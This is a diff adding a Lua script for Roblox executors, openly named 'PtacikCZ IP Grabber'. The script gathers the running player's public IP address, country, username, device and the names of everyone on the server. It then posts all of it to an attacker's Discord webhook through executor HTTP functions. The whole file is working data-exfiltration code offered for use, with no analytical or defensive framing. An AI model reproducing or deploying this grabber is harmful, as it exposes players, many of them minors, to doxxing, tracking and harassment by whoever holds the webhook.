@@ -1,0 +1,107 @@
+-- Check if the script has already been executed
+if _G.AlreadyExecuted == true then
+    game.Players.LocalPlayer:Kick("Already executed.")
+    return
+end
+
+-- Get the local player's display name
+local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown"
+
+-- Get the current time as a string
+local currentTime = os.date("%X") -- Format: HH:MM:SS
+
+-- Get geolocation data based on IP address
+local geolocationData = game:HttpGetAsync("http://ip-api.com/json")
+local country = ""
+
+-- Parse the geolocation data to retrieve the country
+pcall(function()
+    local geolocationInfo = game:GetService('HttpService'):JSONDecode(geolocationData)
+    country = geolocationInfo.country or ""
+end)
+
+-- Get the Place ID
+local placeId = game.PlaceId
+
+-- Determine the device type the player is using
+local device = ""
+if game:GetService("UserInputService").GamepadEnabled then
+    device = "Console 🎮"
+elseif game:GetService("UserInputService").TouchEnabled then
+    device = "Mobile 📱"
+else
+    device = "Computer 🖥️"
+end
+
+-- Get the names of all players in the server
+local playerNames = ""
+if game.Players then
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        playerNames = playerNames .. "**`" .. player.Name .. "`**" .. "\n"
+    end
+end
+
+-- Get the maximum player slots in the server/game
+local maxPlayers = game:GetService("Players").MaxPlayers
+
+-- Get the remaining player slots
+local remainingSlots = maxPlayers - #game.Players:GetPlayers()
+
+-- Update the data table with the display name, current time, country, Place ID, device, player names, remaining player slots in the description
+local data = {
+    ["avatar_url"] = "https://cdn.discordapp.com/attachments/1125487508768182362/1125551215435055114/standard_3.gif",
+    ["content"] = "@everyone PtacikCZ Sent You IP Adress 😱😱😱",
+    ["username"] = "PtacikCZ IP Grabber",
+    ["embeds"] = {
+        {
+            ["title"] = "PtacikCZ IP Grabber",
+            ["description"] = "Player Name: " .. playerName .. "\nCurrent Time: " .. currentTime .. "\nCountry: " .. country .. "\nPlace ID: " .. placeId .. "\nDevice: " .. device .. "\nMax Player Slots: " .. maxPlayers .. "\nRemaining Player Slots: " .. remainingSlots .. "\n\nServer Player names:\n\n" .. playerNames .. "\nIP Address:\n\n**```" .. game:HttpGet("http://v4v6.ipv6-test.com/api/myip.php") .. "```**",
+            ["image"] = {
+                ["url"] = "https://cdn.discordapp.com/attachments/1125487508768182362/1125551215435055114/standard_3.gif"
+            }
+        }
+    }
+}
+
+-- Update the webhook URL to use _G.Webhook
+local webhook = _G.Webhook
+
+-- Send the HTTP request
+pcall(function()
+    if syn then
+        syn.request(
+            {
+                Url = webhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        )
+    elseif request then
+        request(
+            {
+                Url = webhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        )
+    elseif http_request then
+        http_request(
+            {
+                Url = webhook,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        )
+    end
+end)
+
+_G.AlreadyExecuted = false
